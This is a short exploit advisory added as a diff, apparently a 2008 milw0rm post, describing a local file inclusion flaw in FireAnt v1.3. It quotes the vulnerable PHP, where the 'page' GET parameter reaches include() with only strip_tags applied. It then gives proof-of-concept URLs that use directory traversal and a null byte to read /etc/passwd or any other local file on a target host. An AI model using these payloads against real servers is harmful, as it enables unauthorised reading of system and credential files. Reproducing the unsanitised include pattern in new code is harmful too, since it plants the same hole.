@@ -1,0 +1,28 @@
+###################################################################################
+#
+#   Name   : FireAnt v1.3 Local File Inclusion Vulnerability
+#   Author : cOndemned
+#   Dork   : use Your brain (:
+#   Greetz : ZaBeaTy, str0ke, GregStar, irk4z, Sandtalker & Avantura ;**
+#
+###################################################################################
+
+Source :
+
+    // index.php
+
+    8.      $page = "bug_list"; //default page
+    9.      if (!empty($_GET['page'])) {
+    10.         $page = strip_tags($_GET['page']);
+    
+    99.             if (file_exists("./".$page.".php")) { 
+    
+    104.                include("./".$page.".php"); 
+
+    
+Proof of Concept :
+
+    http://[host]/[FireAnt1.3]/index.php?page=../../../../etc/passwd%00
+    http://[host]/[FireAnt1.3]/index.php?page=../../../../[local_file]%00
+
+# milw0rm.com [2008-06-20]
